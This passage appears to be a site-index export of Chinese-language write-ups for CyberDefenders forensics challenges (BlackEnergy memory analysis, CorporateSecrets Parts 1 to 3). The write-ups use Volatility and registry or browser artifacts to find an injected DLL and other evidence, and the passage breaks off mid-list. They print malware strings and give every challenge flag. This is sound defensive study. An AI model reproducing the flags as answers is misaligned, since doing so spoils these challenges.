0x6222000a 0000 ADD [EAX], AL 0x6222000c 0000 ADD [EAX], AL 0x6222000e 0000 ADD [EAX], AL 0x62220010 0000 ADD [EAX], AL 0x62220012 0000 ADD [EAX], AL 0x62220014 0000 ADD [EAX], AL 0x62220016 0000 ADD [EAX], AL 0x62220018 0000 ADD [EAX], AL 0x6222001a 0000 ADD [EAX], AL 0x6222001c 0000 ADD [EAX], AL 0x6222001e 0000 ADD [EAX], AL 0x62220020 0000 ADD [EAX], AL 0x62220022 0000 ADD [EAX], AL 0x62220024 0000 ADD [EAX], AL 0x62220026 0000 ADD [EAX], AL 0x62220028 0000 ADD [EAX], AL 0x6222002a 0000 ADD [EAX], AL 0x6222002c 0000 ADD [EAX], AL 0x6222002e 0000 ADD [EAX], AL 0x62220030 0000 ADD [EAX], AL 0x62220032 0000 ADD [EAX], AL 0x62220034 2a00 SUB AL, [EAX] 0x62220036 2a00 SUB AL, [EAX] 0x62220038 0100 ADD [EAX], EAX 0x6222003a 0000 ADD [EAX], AL 0x6222003c 0000 ADD [EAX], AL 0x6222003e 0000 ADD [EAX], AL Process: svchost.exe Pid: 880 Address: 0x980000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 9, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00980000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x00980010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x00980020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x00980030 00 00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00 ................ 0x00980000 4d DEC EBP 0x00980001 5a POP EDX 0x00980002 90 NOP 0x00980003 0003 ADD [EBX], AL 0x00980005 0000 ADD [EAX], AL 0x00980007 000400 ADD [EAX+EAX], AL 0x0098000a 0000 ADD [EAX], AL 0x0098000c ff DB 0xff 0x0098000d ff00 INC DWORD [EAX] 0x0098000f 00b800000000 ADD [EAX+0x0], BH 0x00980015 0000 ADD [EAX], AL 0x00980017 004000 ADD [EAX+0x0], AL 0x0098001a 0000 ADD [EAX], AL 0x0098001c 0000 ADD [EAX], AL 0x0098001e 0000 ADD [EAX], AL 0x00980020 0000 ADD [EAX], AL 0x00980022 0000 ADD [EAX], AL 0x00980024 0000 ADD [EAX], AL 0x00980026 0000 ADD [EAX], AL 0x00980028 0000 ADD [EAX], AL 0x0098002a 0000 ADD [EAX], AL 0x0098002c 0000 ADD [EAX], AL 0x0098002e 0000 ADD [EAX], AL 0x00980030 0000 ADD [EAX], AL 0x00980032 0000 ADD [EAX], AL 0x00980034 0000 ADD [EAX], AL 0x00980036 0000 ADD [EAX], AL 0x00980038 0000 ADD [EAX], AL 0x0098003a 0000 ADD [EAX], AL 0x0098003c f8 CLC 0x0098003d 0000 ADD [EAX], AL 0x0098003f 00 DB 0x0 :::\n:::spoiler Flag Flag: svchost.exe :::\n==Q6== # There is an odd file referenced in the recent process. Provide the full path of that file.\nExploit # 這一題是靠賽出來的，所以還是參考1比較正常的解法，從上一題已經知道svchost.exe是已經被注入的process，所以我們可以把已經注入過的process dump出來，因為已經很久沒有做相關的題目所以有點卡，如果直接procdump的話是直接把沒有注入過且完整的process dump下來，放到virustotal只會一堆綠，所以要做的應該是malfind搭配dump才對，接著再去分析裡面的strings\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw --profile WinXPSP2x86 malfind --pid 880 --dump-dir=\u0026#34;./Exported Files/\u0026#34; $ strings ./Exported\\ Files/process.0x89aab590.0x980000.dmp -n 15 !This program cannot be run in DOS mode. {3D5A1694-CC2C-4ee7-A3D5-A879A9E3A623} ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ Content-Type: application/x-www-form-urlencoded DispatchCommand GetCurrentProcessId CoCreateInstance InterlockedExchange ConfAllocGetTextByNameA ConfAllocGetTextByNameW ConfGetListNodeByName ConfGetNodeByName ConfGetNodeTextA ConfGetNodeTextW ConfGetRootNode RkLoadKernelImage RkProtectObject SrvAddRequestBinaryData SrvAddRequestStringData @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\u0026gt;@@@?456789:;\u0026lt;=@@@@@@@ !\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./0123@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@q xCYBERDEF-567078_40BF25D3 C:\\WINDOWS\\system32\\drivers\\str.sys \u0026lt;/=(\u0026gt;@\u0026gt;G\u0026gt;O\u0026gt;T\u0026gt;X\u0026gt;\\\u0026gt; 030e0l0p0t0x0|0 :::spoiler Flag Flag: C:\\WINDOWS\\system32\\drivers\\str.sys :::\n==Q7== # What is the name of the injected dll file loaded from the recent process?\nRecon # 這一題完全沒有想法，同樣是參考1，學到一個新東西，不過思路差不多，我是想如果可以利用dlllist直接看pid 880 load進甚麼樣的dll就可以篩選出正確的答案，不過有一個新的plugin更強，叫做==ldrmodules==\nThe ldrmodules plugin can be used to list the loaded modules (DLLs) in a process, and it can also be used to detect unlinked/hidden DLLs. We can use this plugin to examine the malicious svchost.exe process, which has a PID of 880.\n如果比對我的方法和1的方法會發現就是只有差在答案的那一個dll沒有顯示出來而已\nExploit # :::spoiler dlllist (我的方法)\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw --profile WinXPSP2x86 dlllist --pid 880 ************************************************************************ svchost.exe pid: 880 Command line : C:\\WINDOWS\\system32\\svchost -k DcomLaunch Service Pack 3 Base Size LoadCount Path ---------- ---------- ---------- ---- 0x01000000 0x6000 0xffff C:\\WINDOWS\\system32\\svchost.exe 0x7c900000 0xaf000 0xffff C:\\WINDOWS\\system32\\ntdll.dll 0x7c800000 0xf6000 0xffff C:\\WINDOWS\\system32\\kernel32.dll 0x77dd0000 0x9b000 0xffff C:\\WINDOWS\\system32\\ADVAPI32.dll 0x77e70000 0x92000 0xffff C:\\WINDOWS\\system32\\RPCRT4.dll 0x77fe0000 0x11000 0xffff C:\\WINDOWS\\system32\\Secur32.dll 0x5cb70000 0x26000 0x1 C:\\WINDOWS\\system32\\ShimEng.dll 0x6f880000 0x1ca000 0x1 C:\\WINDOWS\\AppPatch\\AcGenral.DLL 0x7e410000 0x91000 0x34c C:\\WINDOWS\\system32\\USER32.dll 0x77f10000 0x49000 0x1f6 C:\\WINDOWS\\system32\\GDI32.dll 0x76b40000 0x2d000 0x4 C:\\WINDOWS\\system32\\WINMM.dll 0x774e0000 0x13d000 0x7e C:\\WINDOWS\\system32\\ole32.dll 0x77c10000 0x58000 0x2ee C:\\WINDOWS\\system32\\msvcrt.dll 0x77120000 0x8b000 0x74 C:\\WINDOWS\\system32\\OLEAUT32.dll 0x77be0000 0x15000 0x1 C:\\WINDOWS\\system32\\MSACM32.dll 0x77c00000 0x8000 0x7 C:\\WINDOWS\\system32\\VERSION.dll 0x7c9c0000 0x817000 0x3 C:\\WINDOWS\\system32\\SHELL32.dll 0x77f60000 0x76000 0x76 C:\\WINDOWS\\system32\\SHLWAPI.dll 0x769c0000 0xb4000 0x4 C:\\WINDOWS\\system32\\USERENV.dll 0x5ad70000 0x38000 0x1 C:\\WINDOWS\\system32\\UxTheme.dll 0x773d0000 0x103000 0x4 C:\\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\\comctl32.dll 0x5d090000 0x9a000 0x1 C:\\WINDOWS\\system32\\comctl32.dll 0x77690000 0x21000 0x1 C:\\WINDOWS\\system32\\NTMARTA.DLL 0x71bf0000 0x13000 0x1 C:\\WINDOWS\\system32\\SAMLIB.dll 0x76f60000 0x2c000 0x2 C:\\WINDOWS\\system32\\WLDAP32.dll 0x76a80000 0x64000 0x1 c:\\windows\\system32\\rpcss.dll 0x71ab0000 0x17000 0x23 c:\\windows\\system32\\WS2_32.dll 0x71aa0000 0x8000 0x24 c:\\windows\\system32\\WS2HELP.dll 0x00670000 0x2c5000 0x1 C:\\WINDOWS\\system32\\xpsp2res.dll 0x76fd0000 0x7f000 0x4 C:\\WINDOWS\\system32\\CLBCATQ.DLL 0x77050000 0xc5000 0x4 C:\\WINDOWS\\system32\\COMRes.dll 0x760f0000 0x53000 0x1 c:\\windows\\system32\\termsrv.dll 0x74f70000 0x6000 0x1 c:\\windows\\system32\\ICAAPI.dll 0x77920000 0xf3000 0x1 c:\\windows\\system32\\SETUPAPI.dll 0x76c30000 0x2e000 0x1 C:\\WINDOWS\\system32\\WINTRUST.dll 0x77a80000 0x95000 0x6c C:\\WINDOWS\\system32\\CRYPT32.dll 0x77b20000 0x12000 0x6b C:\\WINDOWS\\system32\\MSASN1.dll 0x76c90000 0x28000 0x1 C:\\WINDOWS\\system32\\IMAGEHLP.dll 0x776c0000 0x12000 0x1 c:\\windows\\system32\\AUTHZ.dll 0x75110000 0x1f000 0x1 c:\\windows\\system32\\mstlsapi.dll 0x77cc0000 0x32000 0x1 c:\\windows\\system32\\ACTIVEDS.dll 0x76e10000 0x25000 0x1 c:\\windows\\system32\\adsldpc.dll 0x5b860000 0x55000 0x5 C:\\WINDOWS\\system32\\NETAPI32.dll 0x76b20000 0x11000 0x1 c:\\windows\\system32\\ATL.DLL 0x76bc0000 0xf000 0x1 C:\\WINDOWS\\system32\\REGAPI.dll 0x68000000 0x36000 0x1 C:\\WINDOWS\\system32\\rsaenh.dll 0x74980000 0x113000 0x1 C:\\WINDOWS\\system32\\msxml3.dll 0x771b0000 0xaa000 0x69 C:\\WINDOWS\\system32\\wininet.dll 0x71ad0000 0x9000 0x1 C:\\WINDOWS\\system32\\wsock32.dll 0x76ee0000 0x3c000 0x2 C:\\WINDOWS\\system32\\RASAPI32.DLL 0x76e90000 0x12000 0x2 C:\\WINDOWS\\system32\\rasman.dll 0x76eb0000 0x2f000 0x2 C:\\WINDOWS\\system32\\TAPI32.dll 0x76e80000 0xe000 0x3 C:\\WINDOWS\\system32\\rtutils.dll 0x722b0000 0x5000 0x1 C:\\WINDOWS\\system32\\sensapi.dll 0x7e1e0000 0xa2000 0x1 C:\\WINDOWS\\system32\\urlmon.dll 0x71a50000 0x3f000 0x1 C:\\WINDOWS\\System32\\mswsock.dll 0x76f20000 0x27000 0x1 C:\\WINDOWS\\system32\\DNSAPI.dll 0x76fc0000 0x6000 0x1 C:\\WINDOWS\\system32\\rasadhlp.dll :::\n:::spoiler ldrmodules (1的方法)\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw --profile WinXPSP2x86 ldrmodules --pid 880 Pid Process Base InLoad InInit InMem MappedPath -------- -------------------- ---------- ------ ------ ----- ---------- 880 svchost.exe 0x6f880000 True True True \\WINDOWS\\AppPatch\\AcGenral.dll 880 svchost.exe 0x01000000 True False True \\WINDOWS\\system32\\svchost.exe 880 svchost.exe 0x77f60000 True True True \\WINDOWS\\system32\\shlwapi.dll 880 svchost.exe 0x74f70000 True True True \\WINDOWS\\system32\\icaapi.dll 880 svchost.exe 0x76f60000 True True True \\WINDOWS\\system32\\wldap32.dll 880 svchost.exe 0x77c00000 True True True \\WINDOWS\\system32\\version.dll 880 svchost.exe 0x5ad70000 True True True \\WINDOWS\\system32\\uxtheme.dll 880 svchost.exe 0x76e80000 True True True \\WINDOWS\\system32\\rtutils.dll 880 svchost.exe 0x771b0000 True True True \\WINDOWS\\system32\\wininet.dll 880 svchost.exe 0x76c90000 True True True \\WINDOWS\\system32\\imagehlp.dll 880 svchost.exe 0x76bc0000 True True True \\WINDOWS\\system32\\regapi.dll 880 svchost.exe 0x77dd0000 True True True \\WINDOWS\\system32\\advapi32.dll 880 svchost.exe 0x76f20000 True True True \\WINDOWS\\system32\\dnsapi.dll 880 svchost.exe 0x77be0000 True True True \\WINDOWS\\system32\\msacm32.dll 880 svchost.exe 0x7e1e0000 True True True \\WINDOWS\\system32\\urlmon.dll 880 svchost.exe 0x68000000 True True True \\WINDOWS\\system32\\rsaenh.dll 880 svchost.exe 0x722b0000 True True True \\WINDOWS\\system32\\sensapi.dll 880 svchost.exe 0x76e10000 True True True \\WINDOWS\\system32\\adsldpc.dll 880 svchost.exe 0x76b40000 True True True \\WINDOWS\\system32\\winmm.dll 880 svchost.exe 0x773d0000 True True True \\WINDOWS\\WinSxS\\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.5512_x-ww_35d4ce83\\comctl32.dll 880 svchost.exe 0x71a50000 True True True \\WINDOWS\\system32\\mswsock.dll 880 svchost.exe 0x5b860000 True True True \\WINDOWS\\system32\\netapi32.dll 880 svchost.exe 0x00670000 True True True \\WINDOWS\\system32\\xpsp2res.dll 880 svchost.exe 0x76e90000 True True True \\WINDOWS\\system32\\rasman.dll 880 svchost.exe 0x77a80000 True True True \\WINDOWS\\system32\\crypt32.dll 880 svchost.exe 0x71ab0000 True True True \\WINDOWS\\system32\\ws2_32.dll 880 svchost.exe 0x77cc0000 True True True \\WINDOWS\\system32\\activeds.dll 880 svchost.exe 0x71ad0000 True True True \\WINDOWS\\system32\\wsock32.dll 880 svchost.exe 0x774e0000 True True True \\WINDOWS\\system32\\ole32.dll 880 svchost.exe 0x77920000 True True True \\WINDOWS\\system32\\setupapi.dll 880 svchost.exe 0x7e410000 True True True \\WINDOWS\\system32\\user32.dll 880 svchost.exe 0x7c900000 True True True \\WINDOWS\\system32\\ntdll.dll 880 svchost.exe 0x77f10000 True True True \\WINDOWS\\system32\\gdi32.dll 880 svchost.exe 0x77120000 True True True \\WINDOWS\\system32\\oleaut32.dll 880 svchost.exe 0x5cb70000 True True True \\WINDOWS\\system32\\shimeng.dll 880 svchost.exe 0x74980000 True True True \\WINDOWS\\system32\\msxml3.dll 880 svchost.exe 0x009a0000 False False False \\WINDOWS\\system32\\msxml3r.dll 880 svchost.exe 0x77e70000 True True True \\WINDOWS\\system32\\rpcrt4.dll 880 svchost.exe 0x769c0000 True True True \\WINDOWS\\system32\\userenv.dll 880 svchost.exe 0x7c800000 True True True \\WINDOWS\\system32\\kernel32.dll 880 svchost.exe 0x76fd0000 True True True \\WINDOWS\\system32\\clbcatq.dll 880 svchost.exe 0x76b20000 True True True \\WINDOWS\\system32\\atl.dll 880 svchost.exe 0x71bf0000 True True True \\WINDOWS\\system32\\samlib.dll 880 svchost.exe 0x77690000 True True True \\WINDOWS\\system32\\ntmarta.dll 880 svchost.exe 0x77c10000 True True True \\WINDOWS\\system32\\msvcrt.dll 880 svchost.exe 0x760f0000 True True True \\WINDOWS\\system32\\termsrv.dll 880 svchost.exe 0x76fc0000 True True True \\WINDOWS\\system32\\rasadhlp.dll 880 svchost.exe 0x76c30000 True True True \\WINDOWS\\system32\\wintrust.dll 880 svchost.exe 0x7c9c0000 True True True \\WINDOWS\\system32\\shell32.dll 880 svchost.exe 0x77050000 True True True \\WINDOWS\\system32\\comres.dll 880 svchost.exe 0x76eb0000 True True True \\WINDOWS\\system32\\tapi32.dll 880 svchost.exe 0x76a80000 True True True \\WINDOWS\\system32\\rpcss.dll 880 svchost.exe 0x5d090000 True True True \\WINDOWS\\system32\\comctl32.dll 880 svchost.exe 0x71aa0000 True True True \\WINDOWS\\system32\\ws2help.dll 880 svchost.exe 0x776c0000 True True True \\WINDOWS\\system32\\authz.dll 880 svchost.exe 0x76ee0000 True True True \\WINDOWS\\system32\\rasapi32.dll 880 svchost.exe 0x77b20000 True True True \\WINDOWS\\system32\\msasn1.dll 880 svchost.exe 0x75110000 True True True \\WINDOWS\\system32\\mstlsapi.dll 880 svchost.exe 0x77fe0000 True True True \\WINDOWS\\system32\\secur32.dll ::: 可以看到==msxml3r.dll==的三種狀態都是False，代表這個dll不在已經load的memory中，也不在初始化的階段，更不在目前的process memory中，意味著別的工具試圖隱藏該dll\n:::spoiler Flag Flag: msxml3r.dll :::\n==Q8== # What is the base address of the injected dll?\nExploit # 承接第六題，知道malfind之後，他會顯示base address\n$ ./volatility_2.6_win64_standalone.exe -f CYBERDEF-567078-20230213-171333.raw --profile WinXPSP2x86 malfind --pid 880 --dump-dir=\u0026#34; ./Exported Files/\u0026#34; Volatility Foundation Volatility Framework 2.6 Process: svchost.exe Pid: 880 Address: 0x980000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 9, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00980000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 MZ.............. 0x00980010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 ........@....... 0x00980020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x00980030 00 00 00 00 00 00 00 00 00 00 00 00 f8 00 00 00 ................ 0x00980000 4d DEC EBP 0x00980001 5a POP EDX 0x00980002 90 NOP 0x00980003 0003 ADD [EBX], AL 0x00980005 0000 ADD [EAX], AL 0x00980007 000400 ADD [EAX+EAX], AL 0x0098000a 0000 ADD [EAX], AL 0x0098000c ff DB 0xff 0x0098000d ff00 INC DWORD [EAX] 0x0098000f 00b800000000 ADD [EAX+0x0], BH 0x00980015 0000 ADD [EAX], AL 0x00980017 004000 ADD [EAX+0x0], AL 0x0098001a 0000 ADD [EAX], AL 0x0098001c 0000 ADD [EAX], AL 0x0098001e 0000 ADD [EAX], AL 0x00980020 0000 ADD [EAX], AL 0x00980022 0000 ADD [EAX], AL 0x00980024 0000 ADD [EAX], AL 0x00980026 0000 ADD [EAX], AL 0x00980028 0000 ADD [EAX], AL 0x0098002a 0000 ADD [EAX], AL 0x0098002c 0000 ADD [EAX], AL 0x0098002e 0000 ADD [EAX], AL 0x00980030 0000 ADD [EAX], AL 0x00980032 0000 ADD [EAX], AL 0x00980034 0000 ADD [EAX], AL 0x00980036 0000 ADD [EAX], AL 0x00980038 0000 ADD [EAX], AL 0x0098003a 0000 ADD [EAX], AL 0x0098003c f8 CLC 0x0098003d 0000 ADD [EAX], AL 0x0098003f 00 DB 0x0 :::spoiler Flag Flag: 0x980000 :::\nReference # BlackEnergy Walkthrough — Cyberdefenders\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":72,"href":"/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-1/","title":"CyberDefender - CorporateSecrets (Part 1)","section":"Securities","content":" CyberDefender - CorporateSecrets (Part 1) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 2: https://hackmd.io/@SBK6401/ByFhEE8X6 Part 3: https://hackmd.io/@SBK6401/HyHp4NLQT Part 4: https://hackmd.io/@SBK6401/H1rAEV87p\n:::spoiler TOC [TOC] :::\nTools: # FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q1== # What is the current build number on the system?\nExploit # 直接把Software hive從root/Windows/System32/config/ export出來後找Microsoft/Windows NT/CurrentVersion中就有紀錄CurrentBuild number :::spoiler Result :::\n:::spoiler Flag Flag: 16299 :::\n==Q2== # How many users are there?\nExploit # 直接看Microsoft/Windows NT/CurrentVersion/ProfileList有幾個SID就知道了 :::spoiler Flag Flag: 6 :::\n==Q3== # What is the CRC64 hash of the file \u0026ldquo;fruit_apricot.jpg\u0026rdquo;?\nExploit # 在root/Users/hansel.apricot/Pictures/Saved Pictures可以找到，再用線上工具，記得選擇CRC-64-ECMA的演算法才會是對的 :::spoiler Flag Flag: ED865AA6DFD756BF :::\n==Q4== # What is the logical size of the file \u0026ldquo;strawberry.jpg\u0026rdquo; in bytes?\nRecon # 在root/Users/suzy.strawberry/Pictures/可以找到，右鍵看他的內容就知道了 :::spoiler Flag Flag: 72448 :::\n==Q5== # What is the processor architecture of the system? (one word)\nExploit # 這是新的知識，processor architecture就在SYSTEM/ControlSet001/Control/Session Manager/Environment/ :::spoiler Flag Flag: amd64 :::\n==Q6== # Which user has a photo of a dog in their recycling bin?\nRecon # 首先進入recycle bin看到底是哪一個SID丟棄這張圖片，發現是S-1-5-21-2446097003-76624807-2828106174-1005，回到registry去看他的username是甚麼\nExploit # :::spoiler Flag Flag: hansel.apricot :::\n==Q7== # What type of file is \u0026ldquo;vegetable\u0026rdquo;? Provide the extension without a dot.\nRecon # 從root/Users/miriam.grapes/Pictures/就可以找到vegetable，看到前面的file signature就可以知道是7z的壓縮檔\nExploit # :::spoiler Flag Flag: 7z :::\n==Q8== # What type of girls does Miriam Grapes design phones for (Target audience)?\nRecon # 這一題是全部解完才回來解的，因為當初真的一點想法都沒有，不過仔細看Miriam Grapes的folder，發現他是使用firefox當作browser，所以沒想法的時候就看瀏覽紀錄就對了(firefox的artifact就在./Users/miriam.grapes/AppData/Roaming/Mozilla/Firefox/Profiles/9far2v52.default-release/places.sqlite) Exploit # 果然發現一點東西，他設計的這個手機就是面向VSCO女性族群而設計的 What is VSCO?\n有一種意思是指VSCO是一種修圖(濾淨)的APP，全名叫做(Visual Supply Company)，但另一種意思是指一種女性的穿著與生活風格。VSCO Girl幾乎是連在一起的字詞。這種風格的女性穿搭是簡單風，Tshirt 搭配短褲，或是簡單的襯衫與牛仔褲的組合，反正一看就是輕鬆、簡單的穿搭就符合VSCO\n:::spoiler Flag Flag: VSCO :::\n==Q9== # What is the name of the device?\nExploit # 直接看SYSTEM/ControlSet001/Control/ComputerName/ComputerName\n:::spoiler Flag Flag: DESKTOP-3A4NLVQ :::\nReference # "},{"id":73,"href":"/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-2/","title":"CyberDefender - CorporateSecrets (Part 2)","section":"Securities","content":" CyberDefender - CorporateSecrets (Part 2) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 1: https://hackmd.io/@SBK6401/r18z7VIm6 Part 3: https://hackmd.io/@SBK6401/HyHp4NLQT Part 4: https://hackmd.io/@SBK6401/H1rAEV87p\n:::spoiler TOC [TOC] :::\nTools: # FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q10== # What is the SID of the machine?\nExploit # 直接看SOFTWARE/Microsoft/Windows NT/CurrentVersion/ProfileList就知道了 :::spoiler Flag Flag: S-1-5-21-2446097003-76624807-2828106174 :::\n==Q11== # How many web browsers are present?\nRecon # 直接搜索一下所有user的AppData或是program1，可以發現有五個瀏覽器(Firefox / Internet Explorer / Chrome / Edge / Tor) :::spoiler Flag Flag: 5 :::\n==Q12== # How many super secret CEO plans does Tim have? (Dr. Doofenshmirtz Type Beat)\nRecon # 這一題有一點像Enlightened 2023 - Jack的flag\nExploit # 先從tim的document中看有沒有甚麼特別的file 發現secret.odt其中的內容，最後一個部分被隱藏起來了，要複製到其他editor才會發現 Super secret CEO plans: •\tTake over the world •\tDestroy Google •\tRelease the new Fruit Phone •\tFire Jim Tomato :::spoiler Flag Flag: 4 :::\n==Q13== # Which employee does Tim plan to fire? (He\u0026rsquo;s Dead, Tim. Enter the full name - two words - space separated)\nRecon # 呈上題\n:::spoiler Flag Flag: Jim Tomato :::\n==Q14== # What was the last used username? (I didn\u0026rsquo;t start this conversation, but I\u0026rsquo;m ending it!)\nRecon # 我覺得這一題出的不好，應該說題目出到有點看不懂，也可能是我的英文很爛，但反正他要探討的是最後一個使用電腦的帳號為何，所以直覺就是export Security.evtx，然後轉成CSV檔案，接著用timeline explorer找最後一個成功登入者\nExploit # 方法一 方法二 在SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon可以找到 :::spoiler Flag Flag: jim.tomato :::\n==Q15== # What was the role of the employee Tim was flirting with?\nRecon # 這一題完全沒有想法，所以解題過程參考1\nExploit # 主要是export出他在browser上的history database file，並看他的瀏覽紀錄 :::spoiler Flag Flag: secretary :::\n==Q16== # What is the SID of the user \u0026ldquo;suzy.strawberry\u0026rdquo;?\nExploit # 同第十題，suzy.strawberry的SID是S-1-5-21-2446097003-76624807-2828106174-1004\n:::spoiler Flag Flag: 1004 :::\n==Q17== # List the file path for the install location of the Tor Browser.\nExploit # 呈第11題\n:::spoiler Flag Flag: C:\\Program1 :::\n==Q18== # What was the URL for the Youtube video watched by Jim?\nRecon # 這個是有點新的舊觀念，先看Jim的瀏覽器是用哪一個$\\to$Chrome，所以可以查一下Chrome的樓覽紀錄在哪邊$\\to$root/Users/jim.tomato/AppData/Local/Google/Chrome/UserData/Default/中可以找到History這個database file，接著就是用db browser parse這個file\nExploit # :::spoiler Flag Flag: https://www.youtube.com/watch?v=Y-CsIqTFEyY :::\nReference # CyberDefenders: CorporateSecrets\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":74,"href":"/security/practice/cyberdefender/endpoint-forensic/corporatesecrets---medium/cyberdefender---corporatesecrets-part-3/","title":"CyberDefender - CorporateSecrets (Part 3)","section":"Securities","content":" CyberDefender - CorporateSecrets (Part 3) # Challenge: https://cyberdefenders.org/blueteam-ctf-challenges/33 Part 1: https://hackmd.io/@SBK6401/r18z7VIm6 Part 2: https://hackmd.io/@SBK6401/ByFhEE8X6 Part 4: https://hackmd.io/@SBK6401/H1rAEV87p\n:::spoiler TOC [TOC] :::\nTools: # FTK Imager Registry Explorer RegRipper HxD DB Browser for SQLite HindSight Event Log Explorer MFTDump ==Q19== # Which user installed LibreCAD on the system?\nExploit # 我是直接看該檔案在哪個user的資料夾來判斷，當然這個做法有點問題\n:::spoiler Flag Flag: miriam.grapes :::\n==Q20== # How many times \u0026ldquo;admin\u0026rdquo; logged into the system?\nRecon # 呈第14題\nExploit # 不過我不知道為甚麼答案是21，然後我只有找到20個，看了4672也沒有紀錄(怪怪的) :::spoiler Flag Flag: 21 :::\n==Q21== # What is the name of the DHCP domain the device was connected to?\nRecon # 直接看SYSTEM/ControlSet001/Services/Tcpip/Parameters/Interfaces/ :::spoiler Flag Flag: fruitinc.xyz :::\n==Q22== # What time did Tim download his background image? (Oh Boy 3AM . Answer in MM/DD/YYYY HH:MM format (UTC).)\nRecon # 原本的直覺是像第18題一樣把db file export出來看他的網路操作行為，不過其實可以直接看他下載的file，看他的create time就好\nExploit # :::spoiler Flag Flag: 04/05/2020 03:49 :::\n==Q23== # How many times did Jim launch the Tor Browser?\nExploit # 直接把Jim的NTUSER.dat export出來後用timeline explorer看userassist，不過我不確定為甚麼答案是2，因為我查到的都是3 還有另外一個方法是看prefetch，從FTK中export出TOR.EXE-4B50033F.pf，用PECmd.exe解析，但這個更怪了，結果顯示只有執行過一次，所以prefetch參考就好 :::spoiler\n$ ./PECmd.exe -f TOR.EXE-4B50033F.pf PECmd version 1.5.0.0 Author: Eric Zimmerman (saericzimmerman@gmail.com) https://github.com/EricZimmerman/PECmd Command line: -f TOR.EXE-4B50033F.pf Keywords: temp, tmp Processing TOR.EXE-4B50033F.pf Created on: 2023-11-06 17:15:55 Modified on: 2020-04-16 04:52:40 Last accessed on: 2023-11-06 17:17:52 Executable name: TOR.EXE Hash: 4B50033F File size (bytes): 88,080 Version: Windows 10 or Windows 11 Run count: 1 Last run: 2020-04-16 04:52:30 Volume information: #0: Name: \\VOLUME{01d60963b1096880-ecb16432} Serial: ECB16432 Created: 2020-04-03 02:58:03 Directories: 11 File references: 71 Directories referenced: 11 00: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1 01: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER 02: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER 03: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA 04: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\DATA\\TOR 05: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR 06: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS 07: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\GLOBALIZATION 08: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\GLOBALIZATION\\SORTING 09: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32 10: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\EN-US Files referenced: 58 00: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\NTDLL.DLL 01: \\VOLUME{01d60963b1096880-ecb16432}\\PROGRAM1\\BROWSER\\TORBROWSER\\TOR\\TOR.EXE (Executable: True) 02: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\KERNEL32.DLL 03: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\KERNELBASE.DLL 04: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\LOCALE.NLS 05: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\ADVAPI32.DLL 06: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\MSVCRT.DLL 07: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\SECHOST.DLL 08: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\RPCRT4.DLL 09: \\VOLUME{01d60963b1096880-ecb16432}\\WINDOWS\\SYSTEM32\\SHELL32.DLL 10: 